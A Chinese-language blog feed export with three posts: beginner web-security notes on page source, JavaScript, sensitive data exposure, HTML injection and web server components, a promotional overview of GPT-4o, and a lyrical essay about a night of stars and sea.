<p>您可以通过右键单击并选择“查看页面源代码”（Chrome）&#x2F;“显示页面源代码”（Safari）来查看任何网站的 HTML<br><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220170438521-546369975.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234365419-6cae23db-d649-495b-8ffa-7e791f8715d6.png" alt="img"></a><br>第二题<br><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220170728341-2099881821.gif"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234365423-983c1b46-d8a7-4831-9a42-e937414cd214.gif" alt="img"></a><br>第三题<br><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220170737221-60009634.gif"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234365959-59434924-0ffb-41ff-a854-78097cad69eb.gif" alt="img"></a></p>
<h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p>JavaScript (JS) 是世界上最流行的编码语言之一，它允许页面变得交互。HTML 用于创建网站结构和内容，而 JavaScript 用于控制网页的功能——如果没有 JavaScript，页面将没有交互元素并且始终是静态的。JS 可以实时动态更新页面，提供在页面上发生特定事件（例如用户单击按钮时）时更改按钮样式或显示移动动画的功能</p>
<p>JavaScript 添加到页面源代码中，可以在标签中加载，也可以通过 src 属性远程包含：**<script><script src="/location/of/javascript_file.js"></script>**</p>
<p>以下 JavaScript 代码在页面上找到一个 id 为“demo”的 HTML 元素，并将该元素的内容更改为“Hack the Planet”： <strong>document.getElementById(“demo”).innerHTML &#x3D; “Hack the Planet”;</strong></p>
<p>HTML 元素也可以有事件，例如“onclick”或“onhover”，当事件发生时执行 JavaScript。以下代码将具有演示 ID 的元素的文本更改为 Button Clicked： - onclick 事件也可以在 JavaScript 脚本标记内定义，而不是直接在元素上定义。 <strong><button onclick='document.getElementById("demo").innerHTML = "Button Clicked";'>Click Me!</button></strong></p>
<p>后续深入会学到<strong>Javascript</strong>，我们只需看得懂就行了，不需要仔细研究其中的方法和语法之类不必须要的信息。</p>
<h3 id="敏感数据暴露"><a href="#敏感数据暴露" class="headerlink" title="敏感数据暴露"></a>敏感数据暴露</h3><p>当网站没有正确保护（或删除）最终用户的敏感明文信息时，就会发生敏感数据泄露；通常在站点的前端源代码中找到。</p>
<p>我们现在知道网站是使用许多 HTML 元素（标签）构建的，所有这些我们只需“查看页面源代码”就可以看到。网站开发人员可能忘记删除登录凭据、指向网站隐私部分的隐藏链接或以 HTML 或 JavaScript 显示的其他敏感数据。</p>
<p>敏感信息可能会被用来进一步让攻击者访问 Web 应用程序的不同部分。例如，可能有带有临时登录凭据的 HTML 评论，如果您查看页面的源代码并找到它，您可以使用这些凭据在应用程序的其他地方登录（或者更糟，用于访问站点的其他后端组件） ).</p>
<p>每当您评估 Web 应用程序的安全问题时，您应该做的第一件事就是查看页面源代码，看看是否可以找到任何暴露的登录凭据或隐藏的链接。</p>
<p><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220172053543-1483770167.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234366127-7565afcf-0052-4af9-b12f-493436ca9e04.png" alt="img"></a><br><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220172122056-1130996085.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234366130-73db4379-bd3d-47cb-aa07-39ccc0462407.png" alt="img"></a></p>
<h3 id="HTML注入"><a href="#HTML注入" class="headerlink" title="HTML注入"></a>HTML注入</h3><p>HTML 注入是在页面上显示未经过滤的用户输入时发生的漏洞。 如果网站未能净化用户输入（过滤用户输入到网站的任何“恶意”文本），并且在页面上使用了该输入，则攻击者可以将 HTML 代码注入易受攻击的网站</p>
<p>输入清理对于保持网站安全非常重要，因为用户输入网站的信息通常用于其他前端和后端功能</p>
<p>当用户可以控制其输入的显示方式时，他们可以提交 HTML（或 JavaScript）代码，浏览器将在页面上使用它，从而允许用户控制页面的外观和功能</p>
<p><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220172450183-1325886123.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234366105-3aac1240-db7c-4ce3-928e-ba39cc0a8745.png" alt="img"></a></p>
<p>上图显示了表单如何将文本输出到页面。无论用户在“你的名字是什么”字段中输入什么，都会传递给 JavaScript 函数并输出到页面，这意味着如果用户在该字段中添加自己的 HTML 或 JavaScript，它会在 sayHi 函数中使用并添加到页面 - 这意味着您可以添加自己的 HTML（例如 **<h1>**标签），它会将您的输入输出为纯 HTML</p>
<p>一般规则是永远不要相信用户输入。为防止恶意输入，网站开发人员应在将用户输入的所有内容用于 JavaScript 函数之前对其进行清理；在这种情况下，开发人员可以删除任何 HTML 标签</p>
<p><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220173146330-388095613.gif"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234366311-a01c8ce1-42d8-4a60-8937-391f9203692b.gif" alt="img"></a><br><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220174023449-631260011.gif"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234366750-8b508859-cc00-452a-9292-b974911883ae.gif" alt="img"></a><br>**</p>
<h1 id="把他们放在一起"><a href="#把他们放在一起" class="headerlink" title="把他们放在一起"></a>把他们放在一起</h1><p>从前面的了解中，知道了当您在浏览器中请求网页时，幕后发生了很多事情。</p>
<p>总而言之，当您请求一个网站时，您的计算机需要知道它需要与之通信的服务器的 IP 地址；为此，它使用DNS。然后，您的计算机使用一组称为 HTTP 协议的特殊命令与 Web 服务器通信；网络服务器然后返回 HTML、JavaScript、CSS、图像等，然后您的浏览器使用它们来正确格式化并向您显示网站</p>
<p><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220174742287-711476445.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234685005-55ca8137-9853-47aa-b5bf-a8f24f75d4f2.png" alt="img"></a></p>
<p>还有一些其他组件可以帮助网络更有效地运行并提供额外的功能</p>
<h3 id="其他组件"><a href="#其他组件" class="headerlink" title="其他组件"></a>其他组件</h3><p><strong>负载均衡器Load Balancers</strong><br>当网站的流量开始变得非常大或正在运行需要高可用性的应用程序时，一台 Web 服务器可能不再能胜任这项工作。负载均衡器提供两个主要功能，确保高流量网站可以处理负载并在服务器无响应时提供故障转移。</p>
<p>当你请求一个有负载均衡器的网站时，负载均衡器会先接收你的请求，然后转发给它后面的多个服务器中的一个。负载均衡器使用不同的算法来帮助它决定哪个服务器最适合处理请求。这些算法的几个例子是 round-robin，它依次将它发送到每个服务器，或者 weighted，它检查服务器当前正在处理多少请求并将其发送到最不繁忙的服务器。</p>
<p>负载平衡器还对每台服务器进行定期检查，以确保它们正常运行；这称为 健康检查（health check）。如果服务器没有适当响应或没有响应，负载均衡器将停止发送流量，直到它再次做出适当响应。<br><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220175005989-1980051259.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234685017-a9402137-3ceb-4a9b-ad16-9f02a1b881ae.png" alt="img"></a></p>
<p><strong>CDN(Content Delivery Networks内容分发网络)</strong><br>CDN 是减少繁忙网站流量的绝佳资源。它允许您从您的网站托管静态文件，如 JavaScript、CSS、图像、视频，并将它们托管在全球数千台服务器上。当用户请求其中一个托管文件时，CDN 会计算出最近的服务器的物理位置，并将请求发送到那里，而不是潜在的世界另一端</p>
<p><strong>数据库 Database</strong><br>网站通常需要一种为其用户存储信息的方法。网络服务器可以与数据库通信以存储和调用数据库中的数据。数据库的范围可以从简单的纯文本文件到提供速度和弹性的多个服务器的复杂集群。您会遇到一些常见的数据库：MySQL、MSSQL、MongoDB、GraphQL、Postgres 等等；每个都有其特定的功能</p>
<p><strong>WAF（Web Application Firewall网络应用防火墙）</strong><br>WAF 位于您的 Web 请求和 Web 服务器之间；其主要目的是保护网络服务器免受黑客攻击或拒绝服务攻击。它分析常见攻击技术的 Web 请求，判断请求是否来自真实浏览器而不是机器人。它还通过使用称为速率限制的东西检查是否正在发送过多的 Web 请求，这将只允许每秒来自 IP 的一定数量的请求。如果一个请求被认为是潜在的攻击，它将被丢弃并且永远不会发送到网络服务器<br><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220175205865-788367921.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234685042-901741b4-3980-4d9a-8a72-a2ccc2d41ee7.png" alt="img"></a></p>
<p><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220175214896-58982536.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234685044-f9098afd-7be3-4f91-918f-385a83d5390d.png" alt="img"></a></p>
<h3 id="Web服务器如何运作"><a href="#Web服务器如何运作" class="headerlink" title="Web服务器如何运作"></a>Web服务器如何运作</h3><p><strong>什么是网络服务器？</strong><br>Web 服务器是一种侦听传入连接然后利用HTTP协议向其客户端传送 Web 内容的软件。您会遇到的最常见的 Web 服务器软件是 Apache、Nginx、IIS 和 NodeJS。Web 服务器从所谓的根目录传送文件，该目录在软件设置中定义。例如，Nginx 和 Apache 在 Linux 操作系统中共享相同的默认位置 &#x2F;var&#x2F;www&#x2F;html，而 IIS 在 Windows 操作系统中使用 C:\inetpub\wwwroot。因此，例如，如果您请求文件 <a href="http://www.example.com/picture.jpg%EF%BC%8C%E5%AE%83%E5%B0%86%E4%BB%8E%E5%85%B6%E6%9C%AC%E5%9C%B0%E7%A1%AC%E7%9B%98%E9%A9%B1%E5%8A%A8%E5%99%A8%E5%8F%91%E9%80%81%E6%96%87%E4%BB%B6">http://www.example.com/picture.jpg，它将从其本地硬盘驱动器发送文件</a> &#x2F;var&#x2F;www&#x2F;html&#x2F;picture.jpg</p>
<p><strong>虚拟主机(Virtual Hosts)</strong><br>Web服务器可以托管多个不同域名的网站；为此，他们使用虚拟主机。Web 服务器软件检查从HTTP标头请求的主机名，并将其与其虚拟主机进行匹配（虚拟主机只是基于文本的配置文件）。如果找到匹配项，将提供正确的网站。如果未找到匹配项，将提供默认网站</p>
<p>虚拟主机可以将它们的根目录映射到硬盘驱动器上的不同位置。例如，one.com被映射到&#x2F;var&#x2F;www&#x2F;website_one，two.com被映射到 &#x2F;var&#x2F;www&#x2F;website_two</p>
<p>您可以在网络服务器上托管的不同网站的数量没有限制</p>
<p><strong>静态与动态内容(Static Vs Dynamic Content)</strong><br>顾名思义，静态内容是永不改变的内容。这方面的常见示例是图片、javascript、CSS 等，但也可以包括永不更改的 HTML。此外，这些文件是直接从网络服务器提供的，没有对它们进行任何更改</p>
<p>另一方面，动态内容是可以随不同请求而改变的内容。以博客为例。在博客的主页上，它会显示最新的条目。如果创建了新条目，则主页会更新为最新条目，或者第二个示例可能是博客上的搜索页面。根据您搜索的词，将显示不同的结果。</p>
<p>您最终看到的这些更改是在所谓的“ 后端（Backend ）”中 使用编程和脚本语言完成的。之所以称为后端，是因为所做的一切都是在幕后完成的。您无法查看网站的 HTML 源代码并查看后端发生了什么，而 HTML 是后端处理的结果。您在浏览器中看到的一切都称为 前端（Frontend）</p>
<p><strong>脚本和后端语言(Scripting and Backend Languages)</strong></p>
<p>后端语言可以实现的功能没有太多限制，这些是使网站与用户交互的原因。这些语言的一些示例<strong>PHP、Python、Ruby、NodeJS、Perl</strong> 等等</p>
<p>这些语言可以与数据库交互、调用外部服务、处理来自用户的数据等等。一个非常基本的 PHP 示例是，如果您请求网站 <a href="http://example.com/index.php?name=adam">http://example.com/index.php?name=adam</a></p>
<p>如果 index.php 是这样构建的<br><strong><html><body>Hello <?php echo $_GET["name"]; ?></body></html></strong></p>
<p>它将向客户端输出以下内容<br><strong><html><body>Hello adam</body></html></strong></p>
<p>您会注意到客户端看不到任何PHP代码，因为它位于后端上 。这种交互性为尚未安全创建的 Web 应用程序带来了更多安全问题。<br><a href="https://img2023.cnblogs.com/blog/2442110/202302/2442110-20230220175925205-519350590.png"><img src="/../assets/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/1700234685052-a9b59a95-4386-4d4f-8061-2659bba0d932.png" alt="img"></a></p>
]]></content>
  </entry>
  <entry>
    <title>gpt4o</title>
    <url>/2024/05/14/gpt4o/</url>
    <content><![CDATA[<h1 id="探索-GPT-4o：新时代的语言模型"><a href="#探索-GPT-4o：新时代的语言模型" class="headerlink" title="探索 GPT-4o：新时代的语言模型"></a>探索 GPT-4o：新时代的语言模型</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>随着人工智能技术的迅猛发展，语言模型在各个领域中展现了其强大的潜力。OpenAI 最新推出的 GPT-4o 是这一进程中的重要里程碑。本文将深入探讨 GPT-4o 的特点、应用以及未来发展方向。</p>
<h2 id="什么是-GPT-4o？"><a href="#什么是-GPT-4o？" class="headerlink" title="什么是 GPT-4o？"></a>什么是 GPT-4o？</h2><p>GPT-4o 是基于 GPT-4 的升级版本，其设计旨在提供更优化和高效的性能。它不仅在规模上有所提升，还在模型架构和训练方法上进行了多项改进，使其在处理自然语言任务时表现更加卓越。</p>
<h3 id="主要改进"><a href="#主要改进" class="headerlink" title="主要改进"></a>主要改进</h3><ul>
<li><strong>优化架构</strong>：GPT-4o 采用了优化的网络架构，提升了计算效率和生成速度。</li>
<li><strong>增强的理解力</strong>：通过改进的预训练和微调方法，GPT-4o 在理解复杂语境和多层次含义方面表现更加出色。</li>
<li><strong>多模态能力</strong>：GPT-4o 支持文本、图像等多种数据形式的处理和生成，拓展了其应用场景。</li>
</ul>
<h2 id="GPT-4o-的核心特性"><a href="#GPT-4o-的核心特性" class="headerlink" title="GPT-4o 的核心特性"></a>GPT-4o 的核心特性</h2><h3 id="1-卓越的自然语言处理能力"><a href="#1-卓越的自然语言处理能力" class="headerlink" title="1. 卓越的自然语言处理能力"></a>1. 卓越的自然语言处理能力</h3><p>GPT-4o 在文本生成、翻译、摘要等任务中展现了卓越的表现。无论是撰写创意文案还是提供技术文档，GPT-4o 都能生成高质量的文本内容。</p>
<h3 id="2-多语言支持"><a href="#2-多语言支持" class="headerlink" title="2. 多语言支持"></a>2. 多语言支持</h3><p>GPT-4o 支持多语言处理，能够在不同语言之间无缝转换。这使得其在全球化应用中具有重要价值，特别是在跨语言沟通和内容本地化方面。</p>
<h3 id="3-图像与文本的融合"><a href="#3-图像与文本的融合" class="headerlink" title="3. 图像与文本的融合"></a>3. 图像与文本的融合</h3><p>通过集成图像处理能力，GPT-4o 能够理解和生成与图像相关的文本内容。例如，描述图片中的场景、生成图文结合的内容等，为多媒体创作提供了新的工具。</p>
<h2 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h2><h3 id="内容创作与编辑"><a href="#内容创作与编辑" class="headerlink" title="内容创作与编辑"></a>内容创作与编辑</h3><p>GPT-4o 可以大幅提升内容创作效率，从新闻报道到社交媒体内容生成，再到技术文档撰写，覆盖了广泛的应用场景。</p>
<h3 id="客户支持与聊天机器人"><a href="#客户支持与聊天机器人" class="headerlink" title="客户支持与聊天机器人"></a>客户支持与聊天机器人</h3><p>通过集成到客户支持系统中，GPT-4o 能提供更自然和智能的对话体验，快速响应客户的需求并解决问题。</p>
<h3 id="教育与培训"><a href="#教育与培训" class="headerlink" title="教育与培训"></a>教育与培训</h3><p>GPT-4o 可以开发智能教学助手，提供个性化学习建议、自动生成学习资料以及进行实时答疑，助力教育事业的发展。</p>
<h3 id="医疗健康"><a href="#医疗健康" class="headerlink" title="医疗健康"></a>医疗健康</h3><p>在医疗领域，GPT-4o 可以帮助医生进行病历记录、诊断建议以及患者教育，提高医疗服务的效率和质量。</p>
<h2 id="未来展望"><a href="#未来展望" class="headerlink" title="未来展望"></a>未来展望</h2><p>随着 GPT-4o 的不断发展，我们可以期待更多创新应用的出现。未来可能的方向包括：</p>
<ul>
<li><strong>智能助手</strong>：更智能的个人助理，能够理解用户的复杂需求并提供个性化服务。</li>
<li><strong>虚拟创作伙伴</strong>：辅助作家、艺术家等进行创作，提供灵感和建议，拓展创意的边界。</li>
<li><strong>科学研究助手</strong>：在科学研究中，提供数据分析、文献综述和论文撰写的辅助，提高研究效率。</li>
</ul>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>GPT-4o 作为新一代语言模型，展示了人工智能在自然语言处理领域的巨大潜力。其多功能应用和卓越性能，为各行各业带来了新的机遇和挑战。随着技术的不断进步，我们期待看到更多由 GPT-4o 驱动的创新，推动社会的进步与发展。</p>
]]></content>
  </entry>
  <entry>
    <title>夜的遐想</title>
    <url>/2024/05/14/%E5%A4%9C%E7%9A%84%E9%81%90%E6%83%B3/</url>
    <content><![CDATA[<h1 id="繁星与海洋：夜的遐想"><a href="#繁星与海洋：夜的遐想" class="headerlink" title="繁星与海洋：夜的遐想"></a>繁星与海洋：夜的遐想</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>夜幕降临，当繁星点点洒满天际，我们仰望天空，仿佛能窥见宇宙的奥秘。那一刻，我们的心灵如同一片宁静的海洋，荡漾着无限的遐想与思绪。在这静谧的夜晚，让我们一起追随星光，探索那片属于我们的心灵海洋。</p>
<h2 id="星光点点"><a href="#星光点点" class="headerlink" title="星光点点"></a>星光点点</h2><p>夜空如同一幅浩瀚的画卷，繁星点点，犹如钻石般璀璨。每一颗星星都仿佛在低语，诉说着古老的传说与无尽的梦想。</p>
<blockquote>
<p><strong>“星光洒满天际，梦在夜空中起航。”</strong></p>
</blockquote>
<p>当我们凝视星空，那无数光点如同一双双温柔的眼睛，静静注视着我们。在这星光的照耀下，内心的宁静逐渐涌现，仿佛能听见自己的心跳声，与宇宙的脉搏共鸣。</p>
<h2 id="海洋深处"><a href="#海洋深处" class="headerlink" title="海洋深处"></a>海洋深处</h2><p>夜的静谧如同深邃的海洋，包容一切，掩盖了白日的喧嚣。在这片宁静的海洋中，我们的思绪如同鱼儿，自由自在地游弋，探索那未知的深处。</p>
<blockquote>
<p><strong>“海洋深处，藏着心灵的秘境。”</strong></p>
</blockquote>
<p>每一段波浪都是一次心灵的旅程，带我们穿越时间与空间，回到那些珍贵的记忆，或者憧憬未来的梦想。海洋的声音，如同一首无字的诗篇，在我们的心中回荡，带来无限的遐想。</p>
<h2 id="心灵的歌"><a href="#心灵的歌" class="headerlink" title="心灵的歌"></a>心灵的歌</h2><p>在星光与海洋的交汇处，我们的心灵唱起了歌。那是一首充满诗意的旋律，诉说着生命的美好与无常。</p>
<blockquote>
<p><strong>“心灵的歌，在夜晚奏响，编织出梦的篇章。”</strong></p>
</blockquote>
<p>这首歌中，有喜悦，有悲伤，有希望，也有彷徨。正是这些情感，编织成了我们生命的篇章。每一个音符都是真实的，充满了我们对生活的热爱与敬畏。</p>
<h2 id="夜的遐想"><a href="#夜的遐想" class="headerlink" title="夜的遐想"></a>夜的遐想</h2><p>夜晚是一个奇妙的时刻，仿佛为我们打开了一扇通往心灵深处的大门。在这扇门背后，是我们最真实的自己，是那些被白天的忙碌所掩盖的情感与思绪。</p>
<blockquote>
<p><strong>“夜的遐想，带我们回归心灵的故乡。”</strong></p>
</blockquote>
<p>在这宁静的夜晚，让我们放下所有的烦恼，静静地聆听心灵的声音。让星光照亮我们的内心，让海洋的宁静洗涤我们的灵魂。在这片宁静的天地间，我们找到了真正的自己，找到了心灵的故乡。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>夜晚的星光与海洋，是我们心灵的港湾。在这片宁静的天地间，我们找到了归属，找到了内心的平静。愿每一个夜晚，我们都能在星光与海洋的怀抱中，找到属于自己的那片心灵净土，遨游在无尽的遐想与梦境中。</p>
]]></content>
  </entry>
</search>
